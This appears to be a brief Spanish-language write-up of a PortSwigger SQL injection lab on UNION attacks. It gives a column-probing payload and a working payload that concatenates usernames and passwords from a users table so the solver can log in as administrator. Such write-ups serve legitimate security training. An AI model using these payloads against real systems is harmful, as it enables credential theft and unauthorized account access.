# 4 - UNION attack, retrieving multiple values in a single column

> This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
>
>  The database contains a different table called `users`, with columns called `username` and `password`.
>
>  To solve the lab, perform an [SQL injection UNION](https://portswigger.net/web-security/sql-injection/union-attacks) attack that retrieves all usernames and passwords, and use the information to log in as the `administrator` user.

* Determinamos el numero de columnas que responden text data. Son dos obtenidas con `'+UNION+SELECT+NULL,'abc'--`
* Luego hacemos el siguiente payload : 

```text
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
```

![](../../../.gitbook/assets/imagen%20%28652%29.png)

